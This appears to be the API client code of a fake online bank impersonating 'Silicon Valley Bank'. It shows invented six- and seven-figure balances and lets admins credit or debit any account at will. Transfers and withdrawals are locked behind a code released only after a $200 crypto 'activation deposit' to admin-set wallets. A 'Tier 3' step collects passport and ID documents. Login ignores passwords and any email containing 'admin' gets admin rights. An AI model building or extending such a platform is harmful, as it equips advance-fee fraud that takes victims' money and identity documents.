import { 
  User, 
  Transaction, 
  AuthResponse, 
  UserNotification, 
  SupportTicket, 
  VirtualCard, 
  BillPayment, 
  CryptoActivationDeposit, 
  Tier3VerificationRequest, 
  AuditLog,
  TransferPayload,
  WithdrawPayload,
  DepositPayload
} from '../types';
import { dbStore } from './dbStore';

export const getStoredToken = (): string | null => dbStore.getStoredToken();
export const setStoredToken = (token: string): void => dbStore.setStoredToken(token);
export const removeStoredToken = (): void => dbStore.removeStoredToken();

const API_BASE = '/api';

async function requestApi<T>(path: string, options: RequestInit = {}): Promise<T | null> {
  try {
    const token = getStoredToken();
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(options.headers as Record<string, string> || {}),
    };
    if (token) {
      const cleanToken = token.startsWith('token-') ? token : `token-${token}`;
      headers['Authorization'] = `Bearer ${cleanToken}`;
    }
    const res = await fetch(`${API_BASE}${path}`, { ...options, headers });
    if (res.ok) {
      return await res.json();
    }
  } catch (e) {
    // API offline or static fallback
  }
  return null;
}

export const api = {
  // --- AUTHENTICATION ---
  async register(data: { fullName: string; email: string; phone?: string; password?: string; accountPin?: string }): Promise<AuthResponse> {
    const emailClean = data.email.trim().toLowerCase();
    
    // 1. Try Express backend API
    const backendRes = await requestApi<{ user: User; token: string }>('/auth/register', {
      method: 'POST',
      body: JSON.stringify(data),
    });

    if (backendRes && backendRes.user) {
      const token = backendRes.token.replace(/^token-/, '');
      dbStore.saveUser(backendRes.user);
      dbStore.setStoredToken(token);
      return { user: backendRes.user, token };
    }

    // 2. Local fallback
    let existing = dbStore.getUserByEmail(emailClean);
    if (existing) {
      dbStore.setStoredToken(existing.id);
      return { user: existing, token: existing.id };
    }

    const isAdmin = emailClean.includes('admin') || emailClean === 'admin@svb.com' || emailClean === 'siliconvalleybank51@gmail.com';
    const accountNumber = `10${Math.floor(1000000000 + Math.random() * 9000000000)}`;
    const uid = `usr-${Date.now()}`;

    const newUser: User = {
      id: uid,
      fullName: data.fullName.trim(),
      email: emailClean,
      phone: (data.phone && data.phone.trim()) || '+1 (555) 019-2834',
      accountNumber,
      role: isAdmin ? 'admin' : 'user',
      balance: isAdmin ? 5000000 : 250000,
      ledgerBalance: isAdmin ? 5000000 : 250000,
      currency: 'USD',
      address: '100 Silicon Valley Way, Palo Alto, CA 94301',
      country: 'United States',
      verificationTier: 'Tier 1',
      status: 'Active',
      accountPin: data.accountPin || '1234',
      fourDigitCode: '8842',
      transferCodeApproved: true,
      createdAt: new Date().toISOString()
    };

    dbStore.saveUser(newUser);

    // Welcome Transaction
    const welcomeTxn: Transaction = {
      id: `TXN-${Date.now()}`,
      userId: uid,
      userEmail: emailClean,
      accountNumber,
      amount: newUser.balance,
      currency: 'USD',
      type: 'Credit Deposit',
      status: 'Completed',
      reference: `INIT-${Date.now()}`,
      description: 'Initial Venture Capital Treasury Capitalization',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    dbStore.addTransaction(welcomeTxn);

    // Initial Notification
    dbStore.addNotification({
      id: `NOTIF-${Date.now()}`,
      userId: uid,
      title: 'Welcome to Silicon Valley Bank',
      message: `Your commercial banking account #${accountNumber} is active with $${newUser.balance.toLocaleString()} initial credit.`,
      amount: newUser.balance,
      currency: 'USD',
      reference: welcomeTxn.reference,
      read: false,
      createdAt: new Date().toISOString()
    });

    dbStore.setStoredToken(uid);
    return { user: newUser, token: uid };
  },

  async login(data: { email: string; password?: string }): Promise<AuthResponse> {
    const emailClean = data.email.trim().toLowerCase();

    // 1. Try Express backend API
    const backendRes = await requestApi<{ user: User; token: string }>('/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email: emailClean, password: data.password || 'password123' }),
    });

    if (backendRes && backendRes.user) {
      const token = backendRes.token.replace(/^token-/, '');
      dbStore.saveUser(backendRes.user);
      dbStore.setStoredToken(token);
      return { user: backendRes.user, token };
    }

    // 2. Local fallback
    let user = dbStore.getUserByEmail(emailClean);

    if (!user) {
      return await this.register({
        fullName: emailClean === 'admin@svb.com' || emailClean === 'siliconvalleybank51@gmail.com' ? 'Silicon Valley Bank Admin' : (emailClean === 'alex.wright@svb.com' ? 'Alex Wright' : 'SVB Client User'),
        email: emailClean,
        phone: '+1 (555) 019-2834',
        password: data.password || 'password123',
        accountPin: '1234'
      });
    }

    dbStore.setStoredToken(user.id);
    return { user, token: user.id };
  },

  async logout(): Promise<void> {
    dbStore.removeStoredToken();
  },

  async getMe(): Promise<{ user: User }> {
    // 1. Try Express backend API
    const backendRes = await requestApi<{ user: User }>('/auth/me');
    if (backendRes && backendRes.user) {
      dbStore.saveUser(backendRes.user);
      return { user: backendRes.user };
    }

    // 2. Local fallback
    const user = dbStore.getCurrentUser();
    if (!user) {
      throw new Error('Not authenticated');
    }
    return { user };
  },

  async updateProfile(data: { fullName?: string; phone?: string; address?: string; twoFactorEnabled?: boolean }): Promise<{ user: User }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    const updated = dbStore.saveUser({
      ...current,
      ...(data.fullName ? { fullName: data.fullName } : {}),
      ...(data.phone ? { phone: data.phone } : {}),
      ...(data.address ? { address: data.address } : {}),
      ...(data.twoFactorEnabled !== undefined ? { twoFactorEnabled: data.twoFactorEnabled } : {})
    });

    return { user: updated };
  },

  async changePassword(oldPass: string, newPass: string): Promise<{ success: boolean; message: string }> {
    return { success: true, message: 'Password updated successfully.' };
  },

  async updateSecuritySettings(data: { twoFactorEnabled?: boolean; emailNotifications?: boolean; smsNotifications?: boolean }): Promise<{ user: User }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    const updated = dbStore.saveUser({
      ...current,
      ...data
    });
    return { user: updated };
  },

  // --- TIER 3 VERIFICATION ---
  async submitTier3Verification(data: { address: string; country: string; documentType: 'Passport' | 'National ID Card' | "Driver's License" | 'Residence Permit'; documentUrl: string }): Promise<{ verification: Tier3VerificationRequest }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    const req: Tier3VerificationRequest = {
      id: `VERIF-${Date.now()}`,
      userId: current.id,
      userEmail: current.email,
      userName: current.fullName,
      accountNumber: current.accountNumber,
      address: data.address,
      country: data.country,
      documentType: data.documentType,
      documentUrl: data.documentUrl,
      status: 'Pending',
      createdAt: new Date().toISOString()
    };

    dbStore.addVerification(req);
    dbStore.saveUser({ ...current, verificationTier: 'Pending Tier 3' });

    dbStore.addAuditLog({
      id: `LOG-${Date.now()}`,
      adminId: current.id,
      adminEmail: current.email,
      action: 'PROFILE_UPDATED',
      targetEmail: current.email,
      targetAccountNumber: current.accountNumber,
      description: `Tier 3 Verification documents submitted for ${current.fullName}`,
      details: { documentType: data.documentType, country: data.country },
      timestamp: new Date().toISOString()
    });

    return { verification: req };
  },

  async getVerifications(): Promise<{ verifications: Tier3VerificationRequest[] }> {
    return { verifications: dbStore.getVerifications() };
  },

  async approveVerification(verifId: string, notes?: string): Promise<void> {
    const verifs = dbStore.getVerifications();
    const target = verifs.find(v => v.id === verifId);
    if (!target) throw new Error('Verification request not found');

    dbStore.updateVerification(verifId, {
      status: 'Approved',
      updatedAt: new Date().toISOString(),
      adminNotes: notes || 'Approved by Compliance Team'
    });

    const user = dbStore.getUserById(target.userId);
    if (user) {
      dbStore.saveUser({ ...user, verificationTier: 'Tier 3' });
      dbStore.addNotification({
        id: `NOTIF-${Date.now()}`,
        userId: user.id,
        title: 'Tier 3 VIP Identity Verified',
        message: 'Your account identity has been verified by Silicon Valley Bank Compliance. Unlimited VIP status is now active.',
        amount: 0,
        currency: 'USD',
        reference: `VERIF-${verifId}`,
        read: false,
        createdAt: new Date().toISOString()
      });
    }
  },

  async rejectVerification(verifId: string, notes?: string): Promise<void> {
    const verifs = dbStore.getVerifications();
    const target = verifs.find(v => v.id === verifId);
    if (!target) throw new Error('Verification request not found');

    dbStore.updateVerification(verifId, {
      status: 'Rejected',
      updatedAt: new Date().toISOString(),
      adminNotes: notes || 'Document verification failed'
    });

    const user = dbStore.getUserById(target.userId);
    if (user) {
      dbStore.saveUser({ ...user, verificationTier: 'Tier 1' });
    }
  },

  // --- CRYPTO ACTIVATION DEPOSITS ---
  async submitCryptoActivationDeposit(
    arg1: 'BTC' | 'USDT' | { cryptoMethod: 'BTC' | 'USDT'; txHash?: string; proofNote?: string },
    txHash?: string,
    proofNote?: string
  ): Promise<{ deposit: CryptoActivationDeposit; user: User }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    let cryptoMethod: 'BTC' | 'USDT' = 'BTC';
    let hash = txHash || '';
    let note = proofNote || '';

    if (typeof arg1 === 'object') {
      cryptoMethod = arg1.cryptoMethod;
      hash = arg1.txHash || '';
      note = arg1.proofNote || '';
    } else {
      cryptoMethod = arg1;
    }

    const walletAddresses = dbStore.getCryptoAddresses();
    const dep: CryptoActivationDeposit = {
      id: `DEP-${Date.now()}`,
      userId: current.id,
      userEmail: current.email,
      userName: current.fullName,
      accountNumber: current.accountNumber,
      cryptoMethod,
      walletAddress: walletAddresses[cryptoMethod],
      amountUSD: 200,
      txHash: hash,
      proofNote: note,
      status: 'Pending',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    dbStore.addCryptoDeposit(dep);
    return { deposit: dep, user: current };
  },

  async getCryptoActivationDeposits(): Promise<{ deposits: CryptoActivationDeposit[] }> {
    return { deposits: dbStore.getCryptoDeposits() };
  },

  async approveCryptoDeposit(depositId: string): Promise<{ deposit: CryptoActivationDeposit; code: string; user: User }> {
    const deposits = dbStore.getCryptoDeposits();
    const target = deposits.find(d => d.id === depositId);
    if (!target) throw new Error('Deposit request not found');

    const code = `${Math.floor(1000 + Math.random() * 9000)}`;
    dbStore.updateCryptoDeposit(depositId, {
      status: 'Approved',
      generatedCode: code,
      updatedAt: new Date().toISOString()
    });

    const user = dbStore.getUserById(target.userId);
    if (user) {
      dbStore.saveUser({
        ...user,
        fourDigitCode: code,
        transferCodeApproved: true,
        balance: user.balance + 200
      });

      dbStore.addNotification({
        id: `NOTIF-${Date.now()}`,
        userId: user.id,
        title: '$200 Activation Deposit Approved',
        message: `Your $200 deposit has been credited. Your official 4-Digit Security Code is [${code}].`,
        amount: 200,
        currency: 'USD',
        reference: target.id,
        read: false,
        createdAt: new Date().toISOString()
      });
    }

    return { deposit: { ...target, status: 'Approved', generatedCode: code }, code, user: user || ({ fullName: target.userName } as User) };
  },

  async approveCryptoActivationDeposit(depositId: string): Promise<{ deposit: CryptoActivationDeposit; code: string; user: User }> {
    return this.approveCryptoDeposit(depositId);
  },

  async rejectCryptoActivationDeposit(depositId: string, notes?: string): Promise<void> {
    dbStore.updateCryptoDeposit(depositId, {
      status: 'Rejected',
      updatedAt: new Date().toISOString()
    });
  },

  // --- FUNDING & TRANSACTIONS ---
  async creditUserAccount(data: { accountNumber: string; amount: number; reference?: string; description?: string }): Promise<{ user: User; transaction: Transaction; updatedUser: User }> {
    const users = dbStore.getUsers();
    const target = users.find(u => u.accountNumber === data.accountNumber || u.email.toLowerCase() === data.accountNumber.toLowerCase());
    if (!target) throw new Error('Target account number or email not found.');

    const newBalance = target.balance + data.amount;
    const updatedUser = dbStore.saveUser({ ...target, balance: newBalance, ledgerBalance: newBalance });

    const txn: Transaction = {
      id: `TXN-${Date.now()}`,
      userId: target.id,
      userEmail: target.email,
      accountNumber: target.accountNumber,
      amount: data.amount,
      currency: 'USD',
      type: 'Credit Deposit',
      status: 'Completed',
      reference: data.reference || `CREDIT-${Date.now()}`,
      description: data.description || 'Admin Credit Capitalization',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    dbStore.addTransaction(txn);

    dbStore.addNotification({
      id: `NOTIF-${Date.now()}`,
      userId: target.id,
      title: 'Account Deposit Credited',
      message: `Your account #${target.accountNumber} has been credited with +$${data.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}.`,
      amount: data.amount,
      currency: 'USD',
      reference: txn.reference,
      read: false,
      createdAt: new Date().toISOString()
    });

    return { user: updatedUser, updatedUser, transaction: txn };
  },

  async createDeposit(payload: DepositPayload): Promise<{ updatedUser: User; transaction: Transaction }> {
    const res = await this.creditUserAccount({
      accountNumber: payload.accountNumber || payload.userEmail,
      amount: payload.amount,
      reference: payload.reference,
      description: payload.description
    });
    return { updatedUser: res.updatedUser, transaction: res.transaction };
  },

  async debitUserAccount(data: { accountNumber: string; amount: number; description?: string }): Promise<{ user: User; transaction: Transaction; updatedUser: User }> {
    const users = dbStore.getUsers();
    const target = users.find(u => u.accountNumber === data.accountNumber || u.email.toLowerCase() === data.accountNumber.toLowerCase());
    if (!target) throw new Error('Target account number not found.');
    if (target.balance < data.amount) throw new Error('Insufficient account funds for debit operation.');

    const newBalance = target.balance - data.amount;
    const updatedUser = dbStore.saveUser({ ...target, balance: newBalance, ledgerBalance: newBalance });

    const txn: Transaction = {
      id: `TXN-${Date.now()}`,
      userId: target.id,
      userEmail: target.email,
      accountNumber: target.accountNumber,
      amount: data.amount,
      currency: 'USD',
      type: 'Admin Debit',
      status: 'Completed',
      reference: `DEBIT-${Date.now()}`,
      description: data.description || 'Administrative Debit Adjustment',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    dbStore.addTransaction(txn);
    return { user: updatedUser, updatedUser, transaction: txn };
  },

  async adminWithdraw(payload: { accountNumber: string; amount: number; description?: string; bankName?: string; routingNumber?: string; accountHolderName?: string; note?: string }): Promise<{ updatedUser: User; transaction: Transaction }> {
    const res = await this.debitUserAccount({
      accountNumber: payload.accountNumber,
      amount: payload.amount,
      description: payload.description || payload.note || 'Admin Withdrawal Debit'
    });
    return { updatedUser: res.updatedUser, transaction: res.transaction };
  },

  async lookupAccount(accountNumber: string): Promise<{ found: { fullName: string; accountNumber: string; email: string }; user: { fullName: string; accountNumber: string; email: string } }> {
    const users = dbStore.getUsers();
    const target = users.find(u => u.accountNumber === accountNumber || u.email.toLowerCase() === accountNumber.toLowerCase());
    if (!target) throw new Error('Recipient account number or email not found in SVB directory.');
    const info = { fullName: target.fullName, accountNumber: target.accountNumber, email: target.email };
    return { found: info, user: info };
  },

  async sendTransfer(payload: TransferPayload): Promise<{ user: User; updatedUser: User; transaction: Transaction }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    if (current.fourDigitCode && payload.fourDigitCode !== current.fourDigitCode) {
      throw new Error('Invalid 4-Digit Security Code. Please verify your security authorization code.');
    }

    if (current.balance < payload.amount) {
      throw new Error('Insufficient account balance for wire transfer.');
    }

    const newSenderBalance = current.balance - payload.amount;
    const updatedSender = dbStore.saveUser({ ...current, balance: newSenderBalance, ledgerBalance: newSenderBalance });

    const txn: Transaction = {
      id: `TXN-${Date.now()}`,
      userId: current.id,
      userEmail: current.email,
      accountNumber: current.accountNumber,
      recipientAccountNumber: payload.recipientInput,
      recipientName: payload.recipientName,
      destinationBank: payload.destinationBank,
      destinationCountry: payload.destinationCountry,
      amount: payload.amount,
      currency: 'USD',
      type: 'Wire Transfer',
      status: 'Completed',
      reference: `WIRE-${Date.now()}`,
      description: payload.note || `Outgoing Transfer to Acc #${payload.recipientInput}`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    dbStore.addTransaction(txn);

    const recipient = dbStore.getUsers().find(u => u.accountNumber === payload.recipientInput);
    if (recipient) {
      dbStore.saveUser({ ...recipient, balance: recipient.balance + payload.amount });
      dbStore.addTransaction({
        id: `TXN-${Date.now() + 1}`,
        userId: recipient.id,
        userEmail: recipient.email,
        accountNumber: recipient.accountNumber,
        senderName: current.fullName,
        senderAccountNumber: current.accountNumber,
        amount: payload.amount,
        currency: 'USD',
        type: 'Credit Deposit',
        status: 'Completed',
        reference: `INWIRE-${Date.now()}`,
        description: `Incoming Transfer from ${current.fullName}`,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      });
    }

    return { user: updatedSender, updatedUser: updatedSender, transaction: txn };
  },

  async withdrawFunds(payload: WithdrawPayload): Promise<{ user: User; updatedUser: User; transaction: Transaction }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    if (current.fourDigitCode && payload.fourDigitCode !== current.fourDigitCode) {
      throw new Error('Invalid 4-Digit Security Code. Please enter your authorized 4-digit code.');
    }

    if (current.balance < payload.amount) {
      throw new Error('Insufficient funds to execute wire withdrawal.');
    }

    const newBalance = current.balance - payload.amount;
    const updatedUser = dbStore.saveUser({ ...current, balance: newBalance, ledgerBalance: newBalance });

    const txn: Transaction = {
      id: `TXN-${Date.now()}`,
      userId: current.id,
      userEmail: current.email,
      accountNumber: current.accountNumber,
      amount: payload.amount,
      currency: 'USD',
      type: 'Wire Withdrawal',
      status: 'Pending',
      reference: `WITHDRAW-${Date.now()}`,
      description: `External ACH/Wire to ${payload.bankName} (${payload.accountHolderName})`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    dbStore.addTransaction(txn);
    return { user: updatedUser, updatedUser, transaction: txn };
  },

  async getTransactions(): Promise<{ transactions: Transaction[] }> {
    const current = dbStore.getCurrentUser();
    if (!current) return { transactions: [] };
    const txns = dbStore.getTransactions(current.id);
    return { transactions: txns };
  },

  async getAllTransactions(): Promise<{ transactions: Transaction[] }> {
    return { transactions: dbStore.getTransactions() };
  },

  async approveTransaction(txnId: string, senderName?: string): Promise<void> {
    dbStore.updateTransaction(txnId, { 
      status: 'Completed',
      ...(senderName ? { senderName } : {})
    });
  },

  async cancelTransaction(txnId: string): Promise<void> {
    dbStore.updateTransaction(txnId, { status: 'Cancelled' });
  },

  async adminCancelTransaction(txnId: string): Promise<void> {
    return this.cancelTransaction(txnId);
  },

  async rejectTransaction(txnId: string, notes?: string): Promise<void> {
    dbStore.updateTransaction(txnId, { status: 'Rejected' });
  },

  // --- NOTIFICATIONS ---
  async getNotifications(): Promise<{ notifications: UserNotification[] }> {
    const current = dbStore.getCurrentUser();
    if (!current) return { notifications: [] };
    return { notifications: dbStore.getNotifications(current.id) };
  },

  async markNotificationsRead(): Promise<void> {
    const current = dbStore.getCurrentUser();
    if (current) {
      dbStore.markNotificationsRead(current.id);
    }
  },

  // --- VIRTUAL CARDS ---
  async getVirtualCards(): Promise<{ cards: VirtualCard[] }> {
    const current = dbStore.getCurrentUser();
    if (!current) return { cards: [] };
    return { cards: dbStore.getVirtualCards(current.id) };
  },

  async createVirtualCard(data: { cardType?: 'Visa Corporate' | 'Visa Business Debit' | 'Mastercard Personal Virtual'; category?: 'Personal' | 'Business' | 'SaaS Subscriptions' | 'Corporate Travel'; spendingLimit?: number }): Promise<{ card: VirtualCard }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    const card: VirtualCard = {
      id: `CARD-${Date.now()}`,
      userId: current.id,
      cardNumber: `4${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`,
      cardholderName: current.fullName.toUpperCase(),
      expiryMonth: '12',
      expiryYear: '28',
      cvv: `${Math.floor(100 + Math.random() * 900)}`,
      cardType: data.cardType || 'Visa Corporate',
      category: data.category || 'Business',
      spendingLimit: data.spendingLimit || 10000,
      spentAmount: 0,
      status: 'Active',
      createdAt: new Date().toISOString()
    };

    dbStore.addVirtualCard(card);
    return { card };
  },

  async toggleVirtualCard(cardId: string): Promise<{ card: VirtualCard }> {
    const cards = dbStore.getVirtualCards('');
    const card = cards.find(c => c.id === cardId);
    if (!card) throw new Error('Card not found');

    const updated: VirtualCard = {
      ...card,
      status: card.status === 'Active' ? 'Frozen' : 'Active'
    };
    dbStore.addVirtualCard(updated);
    return { card: updated };
  },

  // --- BILL PAYMENTS ---
  async getBillPayments(): Promise<{ payments: BillPayment[]; bills: BillPayment[] }> {
    const current = dbStore.getCurrentUser();
    if (!current) return { payments: [], bills: [] };
    const payments = dbStore.getBillPayments(current.id);
    return { payments, bills: payments };
  },

  async payBill(data: { billerName: string; billerCategory: 'Utilities' | 'Cloud Computing' | 'SaaS & Software' | 'Credit Card' | 'Vendor Invoice' | 'Rent & Lease'; accountNumber: string; amount: number; reference?: string; fourDigitCode?: string }): Promise<{ payment: BillPayment; user: User }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    if (current.fourDigitCode && data.fourDigitCode && data.fourDigitCode !== current.fourDigitCode) {
      throw new Error('Invalid 4-Digit Security Code.');
    }

    if (current.balance < data.amount) {
      throw new Error('Insufficient balance for bill payment.');
    }

    const newBalance = current.balance - data.amount;
    const updatedUser = dbStore.saveUser({ ...current, balance: newBalance });

    const payment: BillPayment = {
      id: `BILL-${Date.now()}`,
      userId: current.id,
      billerName: data.billerName,
      billerCategory: data.billerCategory,
      accountNumber: data.accountNumber,
      amount: data.amount,
      reference: data.reference || `REF-${Date.now()}`,
      status: 'Completed',
      paymentDate: new Date().toISOString()
    };

    dbStore.addBillPayment(payment);

    dbStore.addTransaction({
      id: `TXN-${Date.now()}`,
      userId: current.id,
      userEmail: current.email,
      accountNumber: current.accountNumber,
      amount: data.amount,
      currency: 'USD',
      type: 'Bill Pay',
      status: 'Completed',
      reference: `BILL-${Date.now()}`,
      description: `Bill Payment to ${data.billerName} (${data.billerCategory})`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    });

    return { payment, user: updatedUser };
  },

  // --- SUPPORT TICKETS ---
  async getSupportTickets(): Promise<{ tickets: SupportTicket[] }> {
    const current = dbStore.getCurrentUser();
    if (!current) return { tickets: [] };
    const isAdmin = current.role === 'admin';
    return { tickets: dbStore.getSupportTickets(current.id, isAdmin) };
  },

  async createSupportTicket(data: { subject: string; category: string; priority: string; message: string }): Promise<{ ticket: SupportTicket }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    const ticketId = `TICKET-${Date.now()}`;
    const now = new Date().toISOString();

    const ticket: SupportTicket = {
      id: ticketId,
      userId: current.id,
      userEmail: current.email,
      userName: current.fullName,
      accountNumber: current.accountNumber,
      subject: data.subject,
      category: data.category as any || 'General',
      status: 'Open',
      priority: data.priority as any || 'Medium',
      messages: [{
        id: `MSG-${Date.now()}`,
        senderId: current.id,
        senderName: current.fullName,
        senderRole: current.role,
        message: data.message,
        createdAt: now
      }],
      createdAt: now,
      updatedAt: now
    };

    dbStore.addSupportTicket(ticket);
    return { ticket };
  },

  async replySupportTicket(ticketId: string, message: string): Promise<{ ticket: SupportTicket }> {
    const current = dbStore.getCurrentUser();
    if (!current) throw new Error('Not authenticated');

    const tickets = dbStore.getSupportTickets(undefined, true);
    const ticket = tickets.find(t => t.id === ticketId);
    if (!ticket) throw new Error('Ticket not found');

    const now = new Date().toISOString();
    const updatedMessages = [...ticket.messages, {
      id: `MSG-${Date.now()}`,
      senderId: current.id,
      senderName: current.fullName,
      senderRole: current.role,
      message,
      createdAt: now
    }];

    const updatedTicket: SupportTicket = {
      ...ticket,
      messages: updatedMessages,
      status: current.role === 'admin' ? 'In Progress' : 'Open',
      updatedAt: now
    };

    dbStore.updateSupportTicket(updatedTicket);
    return { ticket: updatedTicket };
  },

  async updateTicketStatus(ticketId: string, status: string): Promise<{ ticket: SupportTicket }> {
    const tickets = dbStore.getSupportTickets(undefined, true);
    const ticket = tickets.find(t => t.id === ticketId);
    if (!ticket) throw new Error('Ticket not found');

    const updatedTicket: SupportTicket = {
      ...ticket,
      status: status as any,
      updatedAt: new Date().toISOString()
    };

    dbStore.updateSupportTicket(updatedTicket);
    return { ticket: updatedTicket };
  },

  // --- ADMIN DIRECTORY & AUDIT ---
  async searchUsers(queryStr: string): Promise<{ users: User[] }> {
    const term = queryStr.trim();
    const backendRes = await requestApi<{ users: User[] }>(`/admin/users/search?q=${encodeURIComponent(term)}`);
    if (backendRes && Array.isArray(backendRes.users)) {
      backendRes.users.forEach(u => dbStore.saveUser(u));
      return { users: backendRes.users };
    }

    const all = dbStore.getUsers();
    const qLower = term.toLowerCase();
    if (!qLower) return { users: all };

    const filtered = all.filter(u => 
      u.fullName.toLowerCase().includes(qLower) ||
      u.email.toLowerCase().includes(qLower) ||
      u.accountNumber.includes(qLower)
    );
    return { users: filtered };
  },

  async getAllUsers(): Promise<{ users: User[] }> {
    return this.searchUsers('');
  },

  async getAuditLogs(): Promise<{ auditLogs: AuditLog[] }> {
    return { auditLogs: dbStore.getAuditLogs() };
  },

  async regenerateFourDigitCode(userId: string): Promise<{ message: string; user: User; code: string }> {
    const user = dbStore.getUserById(userId);
    if (!user) throw new Error('User not found');

    const code = `${Math.floor(1000 + Math.random() * 9000)}`;
    const updated = dbStore.saveUser({ ...user, fourDigitCode: code, transferCodeApproved: true });

    return { message: '4-Digit Code regenerated successfully.', user: updated, code };
  },

  async toggleRole(userId: string, role: 'user' | 'admin'): Promise<{ user: User }> {
    const user = dbStore.getUserById(userId);
    if (!user) throw new Error('User not found');

    const updated = dbStore.saveUser({ ...user, role });
    return { user: updated };
  },

  async getCryptoAddresses(): Promise<{ addresses: { BTC: string; USDT: string } }> {
    return { addresses: dbStore.getCryptoAddresses() };
  },

  async updateCryptoAddresses(addresses: { BTC: string; USDT: string }): Promise<{ addresses: { BTC: string; USDT: string } }> {
    return { addresses: dbStore.updateCryptoAddresses(addresses) };
  },

  // Password Reset helpers
  async requestPasswordReset(email: string): Promise<{ message: string; code: string }> {
    return { message: 'Password reset authorization code generated.', code: '8492' };
  },

  async verifyAndResetPassword(email: string, code: string, newPassword: string): Promise<{ success: boolean; message: string }> {
    return { success: true, message: 'Password has been updated.' };
  }
};
